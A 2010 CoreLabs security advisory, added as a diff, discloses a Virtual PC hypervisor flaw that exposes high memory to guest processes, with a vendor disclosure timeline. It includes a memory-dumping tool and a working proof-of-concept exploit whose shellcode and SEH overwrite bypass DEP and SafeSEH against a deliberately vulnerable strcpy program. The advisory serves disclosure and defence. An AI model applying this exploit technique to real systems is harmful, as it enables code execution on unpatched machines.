@@ -1,0 +1,954 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+   Virtual PC Hypervisor Memory Protection Vulnerability
+
+
+
+1. *Advisory Information*
+
+Title: Virtual PC Hypervisor Memory Protection Vulnerability
+Advisory Id: CORE-2009-0803
+Advisory URL:
+http://www.coresecurity.com/content/virtual-pc-2007-hypervisor-memory-protection-bug
+Date published: 2010-03-16
+Date of last update: 2010-03-16
+Vendors contacted: Microsoft
+Release mode: User release
+
+
+
+2. *Vulnerability Information*
+
+Class: Improper Access Control [CWE-285]
+Impact: Security bypass
+Remotely Exploitable: No
+Locally Exploitable: Yes
+Bugtraq ID: 38764
+CVE Name: N/A
+
+
+
+3. *Vulnerability Description*
+
+Windows Virtual PC and Microsoft Virtual PC 2007 are system
+virtualization desktop applications from Microsoft used to run one or
+many virtual hosts on a single physical system. Windows 7 relies on
+Virtual PC technology to implement the backward compatibility XP Mode
+for legacy Windows applications. Using XP Mode, Windows 7 users can run
+Windows applications on a virtualized Windows XP SP3 operating system
+directly from the Windows 7 desktop but in doing so they may be
+inadvertently increasing their risk due to a bug that makes standard
+Windows anti-exploitation mechanisms ineffective.
+
+A vulnerability found in the memory management of the Virtual Machine
+Monitor makes memory pages mapped above the 2GB available with read or
+read/write access to user-space programs running in a Guest operating
+system. By leveraging this vulnerability it is possible to bypass
+security mechanisms of the operating system such as Data Execution
+Prevention (DEP) [1], Safe Structured Error Handling (SafeSEH) [2] and
+Address Space Layout Randomization (ASLR) [3] designed to prevent
+exploitation of security bugs in applications running on Windows
+operation systems.
+
+Thus applications with bugs that are not exploitable when running in
+non-virtualized operating systems become exploitable if running within a
+guest OS of Virtual PC. In particular, an application running on Windows
+7 in XP Mode may be exploitable while the same application running
+directly on a Windows XP SP3 system is not.
+
+Additionally, software bugs that normally may not be considered
+security-relevant and therefore not prioritized for the development or
+deployment of fixes may suddenly become unpatched and exploitable
+security bugs in the context of this vulnerability.
+
+The vulnerability can be exploited locally within a virtualized system
+to escalate privileges or remotely for code execution in combination
+with any client-side bug for which existing patches have not been
+applied or with any client-side bug for which a fix has not been
+developed after dismissing the bug as not exploitable or of low
+priority. The vulnerability does not seem usable to escape from a
+virtualized OS (guest) to execute code in the context of the
+non-virtualized OS (host). Use of the vulnerability to implement covert
+inter-process communications within the virtualized OS or to establish
+inter-VM communication have not been researched in full but are deemed
+possible.
+
+
+4. *Vulnerable packages*
+
+   . Virtual PC 2007
+   . Virtual PC 2007 SP1
+   . Windows Virtual PC
+   . Virtual Server 2005
+   . Virtual Server 2005 R2 SP1
+
+
+5. *Non-vulnerable packages*
+
+   . Microsoft virtualization products that are based on Hyper-V technology.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+This issue was reported to Microsoft in August 2009. The vendor has
+acknowledged the report and after extensive analysis indicated that it
+plans to solve the problem in future updates to the associated products.
+
+We recommend affected users to run all mission critical Windows
+applications on non-virtualized systems or to use virtualization
+technologies that aren't affected by this bug. Windows operating systems
+and applications that must run virtualized using Virtual PC technologies
+should be kept at the highest patch level possible and monitored to
+detect exploitation attempts.
+
+
+7. *Credits*
+
+This vulnerability was discovered by Nicolas Economou from Core Security
+Technologies. Technical analysis and proof-of-concept tools were
+developed by Nicolas Economou and Diego Juarez from Core's Exploit
+Writers Team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+Operating systems based on Microsoft Windows NT technologies provide a
+flat 32-bit virtual address space that describes 4 gigabytes of virtual
+memory to 32-bit processes. This address space is used by the process to
+map its executable code and the data that it uses during its runtime.
+For performance and efficiency reasons the process address space is
+usually split so that 2 GB of address space are directly accessible by
+the user-mode application process and the other 2 GB are used to map the
+code and data of the operating system and only accessible to kernel code
+[4]. Any attempts from a user-space process to dereference and use
+memory contents mapped at addresses above the 2GB boundary will trigger
+an exception and terminate the offending process.
+
+In some versions of 32-bit Windows operating systems it is possible to
+configure the OS to provide applications with a 3GB flat virtual address
+space but nonetheless the remaining portion is not accessible to
+user-mode processes.
+
+In Microsoft Virtual PC and Windows Virtual PC, the Virtual Machine
+Monitor (VMM) is responsible for mediating access to hardware resources
+and devices from operating systems running in a virtualized environment.
+The transparency and efficiency of this mediation layer is one of the
+core characteristics of modern virtualization technologies. In this
+context, to maintain an equivalent level of risk for the same
+application independently of whether it is running on a virtualized or a
+non-virtualized environment, the OS hardening and anti-exploitation
+mechanisms of a Windows operating system running directly on hardware
+should have the exact same effectiveness and efficiency when the OS runs
+on virtualized HW as when it runs on a Guest OS.
+
+A vulnerability found in the Virtual PC hypervisor invalidates this
+assumption and undermines the effectiveness of anti-exploitation
+mechanisms such as DEP, SafeSEH and ASLR. Incorrect memory management by
+the VMM of Virtual PC makes portions of the VMM worker memory available
+for read or read/write access to user-space processes running in a Guest
+OS. Leaked memory pages are mapped on the Guest OS at virtual addresses
+above the 2GB limit which shouldn't be accessible for user-space programs.
+
+The 'vpdumper' tool can be used to demonstrate the problem.
+
+/-----
+
+#include <windows.h>
+#include <stdio.h>
+#include <ctype.h>
+
+#define ROWS 16
+
+void find_leaked_memory ( void );
+void print_data ( unsigned int , char * , unsigned int );
+
+int main ( void )
+{
+   /* message for users */
+    printf ( "\n*********** vpdumper.exe ***********" );
+    printf ( "\nCreated by Nicolas A. Economou ( neconomou () corest com )" );
+    printf ( "\nCore Security Technologies, Buenos Aires, Argentina (
+2010 )\n" );
+
+    /* Search and Print leaked memory */
+    printf ( "\nsearching leaked memory\n" );
+    find_leaked_memory ();
+
+    return ( 1 );
+}
+
+void find_leaked_memory ( void )
+{
+        char buffer [ 0x1000 ];
+        char *base;
+        int r, w;
+
+        /* search the high address memory area */
+        for ( base = ( char * ) 0x80000000 ; base < ( char * )
+0xfffff000 ; base += 0x1000 )
+        {
+          /* Dark Area */
+          if ( ( unsigned int ) base == 0xe839c000 )
+          {
+            continue;
+          }
+
+          /* Inicialize flags */
+          r = FALSE;
+          w = FALSE;
+
+          /* check readable */
+          if ( IsBadReadPtr ( base , 1 ) == FALSE )
+          {
+            /* set flag */
+            r = TRUE;
+          }
+          /* check writeable */
+          if ( IsBadWritePtr ( base , 1 ) == FALSE )
+          {
+            /* set flag */
+            w = TRUE;
+          }
+          /* if readable or writeable */
+          if ( r == TRUE || w == TRUE )
+          {
+            /* get contents into our buffer */
+            memcpy ( buffer , base , 0x1000 );
+
+            /* print page attributes */
+            printf ( "attributes: " );
+            printf ( "%s" , ( r == TRUE ) ? "R":"" );
+            printf ( "%s" , ( w == TRUE ) ? "W":"" );
+            printf ( "\n" );
+
+            /* print the memory */
+            print_data ( ( unsigned int ) base , buffer , 0x1000 );
+          }
+        }
+}
+
+void print_data ( unsigned int direccion , char *buffer , unsigned int
+bytes_a_imprimir )
+{
+  unsigned int cont;
+  unsigned int i;
+
+/* Imprimo las lineas encontradas */
+  for ( cont = 0 ; cont < bytes_a_imprimir ; cont = cont + ROWS )
+  {
+  /* Imprimo la direccion de la memoria */
+    printf ( "%.8x | " , direccion );
+
+  /* Incremento la direccion a mostrar */
+    direccion = direccion + ROWS;
+
+  /* Imprimo en hexa */
+    for ( i = 0 ; i < ROWS ; i ++ )
+    {
+    /* Imprimo la cantidad que pedi */
+      if ( i < ( bytes_a_imprimir - cont ) )
+      {
+        printf ( "%.2x " , ( unsigned char ) buffer [ i + cont ] );
+      }
+      else
+      {
+        printf ( "   " );
+      }
+    }
+  /* Espacio entre las 2 columnas */
+    printf ( "| " );
+  /* Imprimo en caracteres */
+    for ( i = 0 ; i < ROWS ; i ++ )
+    {
+      if ( i < ( bytes_a_imprimir - cont ) )
+      {
+        printf ( "%c" , ( isgraph ( buffer [ i + cont ] ) ) ? buffer [ i
++ cont ] : '.' );
+      }
+      else
+      {
+        printf ( " " );
+      }
+    }
+  /* Fin de linea */
+    printf ( "\n" );
+  }
+}
+
+- -----/
+
+
+As a result of the vulnerability, Windows bugs generally considered to
+be not exploitable may become exploitable when occurring on an
+application running on a Virtual PC Guest OS. As an example, the 'abo2'
+exercise from gera's Insecure Programming by Example[5] is shown below.
+
+/-----
+
+      /* abo2.c                                       *
+      * specially crafted to feed your brain by gera */
+
+      /* This is a tricky example to make you think   *
+      * and give you some help on the next one       */
+
+      int main(int argv,char **argc) {
+        char buf[256];
+
+        strcpy(buf,argc[1]);
+        exit(1);
+      }
+
+- -----/
+
+
+While 'abo2' is generally considered not exploitable on Windows
+operating systems the 'vp_abo2_launcher'[6] proof-of-concept tool shown
+below demonstrates that it is indeed exploitable when running in Windows
+XP Mode on Windows 7 or an Windows XP SP3 or Windows Vista guest OS in
+Virtual PC.
+
+/-----
+
+#include <windows.h>
+#include <stdio.h>
+#include <process.h>
+
+/****************************************************************************/
+
+unsigned int get_pop_pop_ret ( char );
+int is_pattern ( unsigned char * , unsigned int , unsigned int * );
+
+/****************************************************************************/
+
+char get_code_address [] = ""
+"\xe8\xff\xff\xff\xff\xf0"  // "call $-1"
+"\x58"                      // "pop eax"
+"\x58"                      // "pop eax"
+"\xeb\x0a"                  // "jmp $+10"
+"calc.exe\x01\x01"          // process
+"\x04\x05"                  // "add al,5"
+"\xfe\x48\x08";             // "dec byte ptr [eax+0x09]"
+
+char call_to_winexec [] = ""
+"\xbb\x33\x33\x33\x33"      // "mov ebx,WinExec"
+"\x6a\x01"                  // "push 1"
+"\x50"                      // "push eax"
+"\xff\xd3";                 // "call ebx"
+
+char call_to_exit [] = ""
+"\xbb\x33\x33\x33\x33"      // "mov ebx,ExitProcess"
+"\x6a\x01"                  // "push 1"
+"\xff\xd3";                 // "call ebx"
+
+/****************************************************************************/
+
+void main ( int argc , char *argv [] )
+{
+  char shellcode [ 1024 ];
+  char buffer [ 1024 ];
+  char *args [ 3 ];
+  unsigned int exit_process;
+  unsigned int address;
+  unsigned int winexec;
+
+/* check parameters */
+  if ( argc != 3 || ( ( strcmp ( argv [ 1 ] , "r" ) != 0 && strcmp (
+argv [ 1 ] , "w" ) != 0 ) ) )
+  {
+    printf ( "\nuse: vp_abo2_launcher <r|w> abo2.exe\n" );
+    printf ( "- option r: search a pop-pop-ret in the leaked memory\n" );
+    printf ( "- option w: write a pop-pop-ret in the first writeable
+leaked page\n" );
+    printf ( "\nCreated by Nicolas A. Economou ( neconomou () corest com )" );
+    printf ( "\nCore Security Technologies, Buenos Aires, Argentina (
+2010 )\n" );
+    return;
+  }
+
+/* search for a pop-pop-ret */
+  printf ( "\nsearching pop-pop-rets " );
+  address = get_pop_pop_ret ( *argv [ 1 ] );
+
+/* if nothing is found... */
+  if ( address == 0 )
+  {
+  /* stop the search */
+    printf ( "\nERROR: pop-pop-ret not found\n" );
+    return;
+  }
+
+/* print found pop-pop-ret address */
+  printf ( "\npop-pop-ret found at %x\n" , address );
+
+/* Resolve WinExec address */
+  winexec = ( unsigned int ) GetProcAddress ( GetModuleHandle (
+"kernel32.dll" ) , "WinExec" );
+  memcpy ( &call_to_winexec [ 1 ] , &winexec , sizeof ( unsigned int ) );
+
+/* Resolve ExitProcess address */
+  exit_process = ( unsigned int ) GetProcAddress ( GetModuleHandle (
+"kernel32.dll" ) , "ExitProcess" );
+  memcpy ( &call_to_exit [ 1 ] , &exit_process , sizeof ( unsigned int ) );
+
+/* build up shellcode */
+  sprintf ( shellcode , "%s%s%s" , get_code_address , call_to_winexec ,
+call_to_exit );
+
+/* buffer init */
+  memset ( buffer , 0 , 1024 );
+
+/* build the buffer */
+  memset ( buffer , '\x90' , 0x124 );
+  memcpy ( buffer , shellcode , strlen ( shellcode ) );
+  strcat ( buffer , "\x90\x90\xeb\x04" );
+  strncat ( buffer , ( char * ) &address , 4 );
+  strcat ( buffer , "\xe9\xcf\xfe\xff\xff" );
+  strcat ( buffer ,
+"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+);
+
+/* launch abo2 */
+  printf ( "launching abo2.exe ...\n" );
+  args [ 0 ] = argv [ 2 ];
+  args [ 1 ] = buffer;
+  args [ 2 ] = NULL;
+  execv ( argv [ 2 ] , &args );
+
+  printf ( "done\n" );
+}
+
+/****************************************************************************/
+
+unsigned int get_pop_pop_ret ( char option )
+{
+  char buffer [ 0x1000 ];
+  unsigned int address = 0;
+  char *base;
+  int r, w;
+
+/* search the high address memory area */
+  for ( base = ( char * ) 0x80000000 ; base < ( char * ) 0xfffff000 ;
+base += 0x1000 )
+  {
+  /* Dark Area */
+    if ( ( unsigned int ) base == 0xe839c000 )
+    {
+      continue;
+    }
+
+  /* show some progress */
+    if ( ( ( unsigned int ) base % 0x1000000 ) == 0 )
+    {
+      printf ( "." );
+    }
+
+  /* Inicialize flags */
+    r = FALSE;
+    w = FALSE;
+
+  /* check readable */
+    if ( IsBadReadPtr ( base , 1 ) == FALSE )
+    {
+    /* set flag */
+      r = TRUE;
+    }
+
+  /* check writeable */
+    if ( IsBadWritePtr ( base , 1 ) == FALSE )
+    {
+    /* set flag */
+      w = TRUE;
+    }
+
+  /* if searching for readable area */
+    if ( option == 'r' )
+    {
+    /* if readable */
+      if ( r == TRUE )
+      {
+      /* get contents into our buffer */
+        memcpy ( buffer , base , 0x1000 );
+
+      /* pattern search */
+        is_pattern ( ( unsigned char * ) buffer , ( unsigned int ) base
+, &address );
+      }
+    }
+  /* if searching for writeable */
+    else if ( option == 'w' )
+    {
+    /* if area is writeable */
+      if ( w == TRUE )
+      {
+      /* write a pop-pop-ret */
+        memcpy ( base + 0x10 , "\x58\x58\xc3" , 3 );
+
+      /* return address + 0x10 ( to avoid a zero in the address ) */
+        address = ( unsigned int ) base + 0x10;
+      }
+    }
+
+  /* if a matching address is found */
+    if ( address != 0 )
+    {
+    /* if the address contains a zero ( INVALID CHAR ) */
+      if ( ( ( address & 0x00ff0000 ) == 0 ) || ( ( address & 0x0000ff00
+) == 0 ) || ( ( address & 0x000000ff ) == 0 ) )
+      {
+      /* keep searching */
+        address = 0;
+      }
+    /* if no zeroes */
+      else
+      {
+      /* stop searching */
+        break;
+      }
+    }
+  }
+
+  return ( address );
+}
+
+/****************************************************************************/
+
+int is_pattern ( unsigned char *buffer , unsigned int base , unsigned
+int *address )
+{
+  unsigned int cont;
+  int ret = FALSE;
+
+/* search the memory area */
+  for ( cont = 0 ; cont < 0x1000 - 3 ; cont ++ )
+  {
+  /* if I get a "POP" */
+    if ( ( buffer [ cont + 0 ] >= 0x58 ) && ( buffer [ cont + 0 ] <=
+0x5f ) )
+    {
+    /* if I get another "POP" */
+      if ( ( buffer [ cont + 1 ] >= 0x58 ) && ( buffer [ cont + 1 ] <=
+0x5f ) )
+      {
+      /* if I get a "RET" or "RET n" */
+//        if ( ( buffer [ cont + 2 ] == 0xc2 ) || ( buffer [ cont + 2 ]
+== 0xc3 ) )
+        if ( buffer [ cont + 2 ] == 0xc3 )
+        {
+        /* return the address */
+          *address = base + cont;
+
+        /* return TRUE ( pattern found ) */
+          ret = TRUE;
+
+        /* stop search */
+          break;
+        }
+      }
+    }
+  }
+
+  return ( ret );
+}
+
+- -----/
+
+
+To verify this vulnerability with a real-world example, we have
+investigated the Sun Java System Webserver WebDAV remote buffer overflow
+vulnerability disclosed in January 2010 [7]. The bug was proved
+exploitable reliably [8] on DEP enabled systems running as Guest OS on
+Virtual PC.
+
+Use of the Virtual PC memory protection bug to bypass anti-exploitation
+mechanisms of the Guest OS is just one security relevant use case.
+Leveraging read access to leaked memory to obtain confidential or
+otherwise sensitive information and/or use of write access to leaked
+memory pages to establish a communication channel with another Guest OS
+are other potential attacks that were not investigated.
+
+
+9. *Report Timeline*
+
+. 2009-08-19:
+Core Security Technologies notifies the Microsoft team of the
+vulnerability and sends a brief technical report.
+
+. 2009-08-19:
+The Microsoft team acknowledges the vulnerability report.
+
+. 2009-08-26:
+The Microsoft team requests some proof of concept code and the version
+of the 'vmm.sys' file affected. Also requests information about whether
+Hardware Assisted Virtualization (HAV) is active or not when triggering
+the bug.
+
+. 2009-08-27:
+Core Security Technologies sends the Microsoft team the information
+requested. The vulnerability was triggered on Virtual PC SP1 with and
+without HAV, using a Windows XP SP2 guest OS over a Windows XP SP3 host OS.
+
+. 2009-09-08:
+MSRC acknowledges Core email.
+
+. 2009-09-08:
+Vendor says that it is still investigating the bug and will have more
+concrete details in a few days.
+
+. 2009-09-14:
+Core Security Technologies acknowledges receipt and says it will be in
+touch to coordinate the publication date and the bug details.
+
+. 2009-09-16:
+Vendor says that they are still investigating the issue since it is a
+very complex one with many dependencies. The vendor confirms the
+vulnerability reproduction code is working and that they are assessing
+the impact for both guest and host machines.
+
+. 2009-10-06:
+Core Security Technologies requests an update on the issue. Core
+Security Technologies also notifies the Vendor that November 16th is the
+scheduled publication date but reminds that the date can be coordinated
+with the vendor.
+
+. 2009-10-08:
+MSRC says that it is looking at the issue with priority, confirmed the
+findings using the provided proof-of-concept tool but it is still
+assessing the risks and will be back in touch in the next few days.
+
+. 2009-10-28:
+MSRC asks if Core Security Technologies has been able to exploit the
+issue to achieve either a denial of service attack on either the guest
+or host OS or managed to elevate privileges on the system.
+
+. 2009-10-28:
+Core replies that the ways to abuse access to the leaked memory have not
+been investigated but that the bug seemed relevant enough to report it
+as a security issue. Exploitation for specific purposes would require
+further work and Core Security Technologies may do it but it was not
+deemed a pre-requisite to report the bug to MSRC. Core asks the vendor
+if they have any findings that rules out exploitation for privilege
+escalation and denial of service attacks.
+
+. 2009-11-04:
+Status update from MSRC saying that the investigation into the issue was
+concluded. The issue was successfully identified with the PoC provided
+by Core. After extensive review it was determined that all the memory
+locations identified by the tool fall within the work area of the
+Virtual Machine Monitor. The findings are that the contents of the RW
+pages are not trusted by Virtual PC and overwritten before use and that
+RO pages are not sensitive and do not expose either OS or user data. The
+investigation concluded that the memory areas accessible from the guest
+cannot be leveraged to achieve either remote code execution or elevation
+of privilege and that no data from the host is exposed to the guest OS.
+MSRC asks if Core disagrees with the assessment and whether there are
+any other concerns that have not been addressed.
+
+. 2009-11-04:
+Core replies that the discoverer did further research into this issue
+since the last communication and agrees with the assessment that the
+leaked pages are part of the VMM work area. With regards to any other
+concerns regarding the issue Core says that it is in the process of
+preparing proof-of-concept code that demonstrates how standard
+anti-exploitation mechanisms of Windows operating systems can be
+circumvented with shellcode that returns into the memory pages leaked by
+the VMM which would make exploitation of bugs in the guest OS much
+easier than in the non-virtualized equivalent. Core believes that is
+enough to qualify the issue as a legitimate security bug that requires
+issuance of a fix and a corresponding security bulletin, particularly if
+its determined that the example case is also applicable to Windows 7 XP
+Mode. Core indicates that it will follow up within a week and reminds
+MSRC that it is still considering a security bug and maintaining its
+plan to publish a security advisory about it.
+
+. 2009-11-09:
+Core says that it identified a way in which the bug can be leveraged to
+circumvent SafeSEH and DEP by using shellcode that jumps to a sequence
+of POP-POP-RET instructions to be found anywhere in the leaked pages.
+This makes it possible and much easier to exploit bugs on virtualized
+systems than on those that aren't virtualized. A proof of concept
+exploit for the abo2 exercise is provided, the same techniques were
+tested and verified to work on Windows 7 XP Mode. Core asks if this
+scenario meets the vendor's criteria for a vulnerability that requires a
+fix and a security bulletin release.
+
+. 2009-11-09:
+MSRC acknowledges reception of the new details and PoC and says that it
+was passed to the product team to reproduce the bug and that they will
+get back in touch soon.
+
+. 2009-11-12:
+MSRC says that it agrees about the seriousness of the issue and that it
+has now involved the team responsible for the anti-exploitation
+mechanisms to assess it correctly. The next estimated time for a status
+update is November 18 and therefore ask Core to confirm that its not
+planning to publish the security advisory on November 16.
+
+. 2009-11-12:
+Core Security Technologies replies that it has re-scheduled publication
+to the second Tuesday of December 2009 (December 8) and may discuss
+further postponements once MSRC provides more details about the bug and
+the plan to fix it. Core notes that it provided only one possible
+exploitation scenario and did not investigate others because it seemed
+that a single example was sufficient to explain the implied risks.
+
+. 2009-11-12:
+MSRC acknowledges receipt of previous mail.
+
+. 2009-11-19:
+MSRC status update explains there is no new information available, and
+that discussion about how to address the bug still ongoing.
+
+. 2009-11-19:
+Core says that in a separate ongoing case MSRC had dismissed all
+variants of an unrelated MS Excel vulnerability in BIFF file formats
+reported in CORE-2009-0827 as not relevant to security because it can
+only be triggered to cause a copy operation from memory locations above
+3GB which would terminate the application without any possibility for
+exploitation. The assumption that accesses to memory addresses above 3GB
+will simply terminate the process is no longer valid in the context of
+the Virtual PC hypervisor bug and thus this may outline another scenario
+for exploitation of bugs that may have been deemed unexploitable before
+and for which it is probable that fixes have not been developed.
+
+. 2009-11-12:
+MSRC acknowledges receipt of previous mail. Will provide additional
+conclusions to the team for analysis.
+
+. 2009-12-04:
+MSRC says that it didn't identify any way to leverage the Virtual PC bug
+to make exploitation of the Excel BIFF bug possible. According to the
+vendor's engineering team the exposed memory pages have no influence on
+the exploitability of the reported bug in Excel. The bug reported in
+Excel was deemed not exploitable at all not because of a defense in
+depth mechanism but to a hard boundary, MSRC asks for more details or
+PoC that demonstrate that the bug may be exploitable. However, the
+Virtual PC bug is still being reviewed and to make sure that it is
+considered appropriately the vendors asks Core to postpone publication
+of the advisory for an additional month. The vendor is still under the
+impression that this is an issue to be considered for a service pack and
+that it is lacking information to warrant a security bulletin.
+
+. 2009-12-07:
+Core reiterates that the original report provided a sample program
+(abo2) deemed not exploitable under normal conditions that becomes
+exploitable when running within a Virtual PC guest and that the analysis
+used to dismiss the Excel bug as not exploitable was based on the fact
+that attempts to perform read operations to memory addresses above the
+3GB boundary cannot be used for anything but to terminate the offending
+process. Core pointed out that the Virtual PC bug invalidates the
+premise of that analysis and thus the conclusions should not longer be
+considered an indisputable truth. Furthermore, since many organizations
+currently rolling out Windows 7 may be relying on XP Mode to maintain
+compatibility with XP applications and that in doing so they may be
+inadvertently weakening their security posture in Core's view this
+warrants the need for a security bulletin and corresponding security
+patch. Accordingly Core has set the publication date for the Virtual PC
+advisory to the 2nd Tuesday of February and will not change it unless
+new information or a change in the vendor's stance occurs. If the vendor
+does not consider it a security issue then Core would rather publish the
+security bulletin without an official patch rather than have its
+publication contingent on the release cycle of a service pack at some
+undetermined time in the future.
+
+. 2009-12-31:
+MSRC acknowledges receipt of previous mail and indicates that it will
+follow up on January 8th 2010 with a final decision on how it is
+planning to tackle the issue.
+
+. 2010-01-11:
+Vendor says that it has completed the investigation of the Virtual PC
+issue. It agrees with Core's conclusions. The bug has two implications:
+1) It allows an attacker to bypass DEP and SafeSEH. However as these are
+defense in depth mechanisms it would not be sufficient to issue a
+security bulletin. 2) In specific limited conditions it causes
+vulnerabilities that were deemed not exploitable to become exploitable.
+This does break a security boundary and it is something that needs to be
+addressed. Addressing the issue will require substantial work in Virtual
+PC and Virtual Server code and has a significant wider scoped fix with
+high application compatibility impact. The VPC team is assessing the
+workload required to address the issue. MSRC will get back to Core on
+February 2nd 2010 with an update.
+
+. 2010-01-11:
+Core acknowledges receipt of previous mail. Core asks if the vendor is
+still considering that the issue does not merit a security bulletin. If
+the answer is positive, Core will proceed with the publication of its
+advisory according to plan. If the answer is negative Core may decide to
+delay its publication depending on the vendor's estimate for a patch
+release date that Core expects to receive on the next scheduled status
+update. Core asks for clarifications about the vendor's mention to high
+application compatibility impact.
+
+. 2010-02-03:
+Core asks for a status update
+
+. 2010-02-03:
+MSRC acknowledges receipt of previous email, will get back within the
+next 48 hours.
+
+. 2010-02-03:
+Core acknowledges receipt of previous email, reminds that advisory
+publication is scheduled for Feb. 9 and requests confirmation that
+Virtual Server is also affected.
+
+. 2010-02-05:
+MSRC acknowledges receipt of previous email, says that the team is still
+running into issues finding the best way to address the vulnerability.
+The team has not found a satisfactory way of resolving the issue without
+large application compatibility repercussions. Vendor asks Core to
+postpone publication for an additional two weeks of time to involve
+additional people in an attempt to find a good way to address the problem.
+
+. 2010-02-05:
+Core agrees to postpone publication of the security advisory for a month
+and re-sets the publication date to March 2, 2010. Core says that it
+will need answers to 4 items in order to revisit the current deadline
+again: 1- The vendor's agreement that this is a security issue that will
+be resolved with a security fix and the corresponding security bulletin.
+2- An up to date and complete list of affected platforms (having just
+recently learned that Virtual Server is also affected). 3- A clear
+technical description of the origin and root cause of the problem. 4- A
+plan with a reasonable estimate for a fix release date. While Core
+understands that the vulnerability is complex and difficult to fix it is
+also aware that the ongoing adoption and deployment of Windows 7 makes
+the knowledge of the risks associated to migrating execution of Windows
+XP applications to the XP Mode virtualized environment critical to
+security-conscious organizations that need to make informed decisions
+about their IT security risk. The growth rate of the installed base of
+Virtual PC technology resulting from the increased adoption of Windows 7
+makes this an increasingly bigger problem as more time passes.
+
+. 2010-02-25:
+MSRC indicates that having thoroughly reviewed the issue over the past
+weeks the issue is still considered to only meet the bar as "a defense
+in deep issue" and reiterates the conclusions stated in the previous
+vendor email. The vendor says that the current plan is to consider
+mitigating the issue in a future release of the affected products and
+asks to receive the final version of Core advisory before it is
+published to corroborate that it matches their understanding of the issue.
+
+. 2010-03-03:
+MSRC requests a status update
+
+. 2010-03-03:
+Core replies that its still working on gathering more details to
+finalize the final draft of the advisory and that as soon as that work
+is completed it will be published. Core is currently working on two
+tacks: 1- Identifying the root cause of the problem to have a more clear
+understanding of the effects and potential mitigations other than
+recommending users simply to not use Virtual PC. 2- Identifying cases of
+previously disclosed vulnerabilities that would be more easily
+exploitable running in a Virtual PC guest OS. As soon as any of those
+two tacks yields usable results the advisory will be completed and
+published. The publication date is estimated for within 15 days.
+
+. 2010-03-10:
+Core status update to MSRC, publication set for Tuesday March 16th.
+While working on the two items described in the previous email, Core has
+determined that is quite likely that the bug can also be used to bypass
+ASLR on Guest OS that support it by using instructions at fixed (or
+nearly fixed) locations of the leaked pages as trampolines. Use of the
+leaked pages as a covert IPC mechanism for intra-guest processes is also
+a possibility. Core requests confirmation that Hyper-V is not affected.
+
+. 2010-03-15:
+MSRC confirms that Hyper-V is not affected. Asks for a copy of the
+advisory to be published on the 16th.
+
+. 2010-03-15:
+MSRC notes that it was contacted by a reporter inquiring about the issue.
+
+. 2010-03-15:
+Core acknowledges receipt of previous email, says that the advisory is
+still in editing process and indicates that a press release will be
+published as well. Speculates that the press inquire may have been the
+result of Core pre-announcing the upcoming press release about a Virtual
+PC vulnerability for the following day.
+
+. 2010-03-16:
+Advisory CORE-2009-0803 published.
+
+
+
+10. *References*
+
+[1] Microsoft Security Research and Defense Blog: Understanding DEP as a
+mitigation technology.
+http://blogs.technet.com/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx
+[2] How to enable Structured Exception Handling Overwrite Protection
+(SEHOP) in Windows operating systems.
+http://support.microsoft.com/kb/956607
+[3] Address Space Layout Randomization in Windows Vista.
+http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx
+[4] Pushing the Limits of Windows: Virtual Memory.
+http://blogs.technet.com/markrussinovich/archive/2008/11/17/3155406.aspx
+[5] gera's Insecure Programming by example,
+http://community.corest.com/~gera/InsecureProgramming/
+[6] Proof-of-concept exploitation tool for the ABO2 exercise (compiled
+with Borland BCC32).
+http://corelabs.coresecurity.com/index.php?module=Wiki&action=attachment&type=advisory&page=CORE-2009-0803&file=vp_abo2_launcher.c
+[7] Multiple security vulnerabilities in the HTTP TRACE, WebDAV and
+Digest Authentication Methods in the Sun Java System Web Server and Sun
+Java System Web Proxy Server.
+http://sunsolve.sun.com/search/document.do?assetkey=1-66-275850-1
+[8] Proof-of-concept exploitation tool for the Java System Webserver
+buffer overflow when running on a Virtual PC guest.
+http://corelabs.coresecurity.com/index.php?module=Wiki&action=attachment&type=advisory&page=CORE-2009-0803&file=sunjavawebserver-webdav-vpc-poc.zip
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2010 Core Security
+Technologies and (c) 2010 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iEYEARECAAYFAkuf5fwACgkQyNibggitWa2IuwCeJitqH31/htKYFIuoeXVVbmmN
+lscAn1z+fpwqI7rbHnJbjRujiZ3mfJOJ
+=hgB9
+-----END PGP SIGNATURE-----
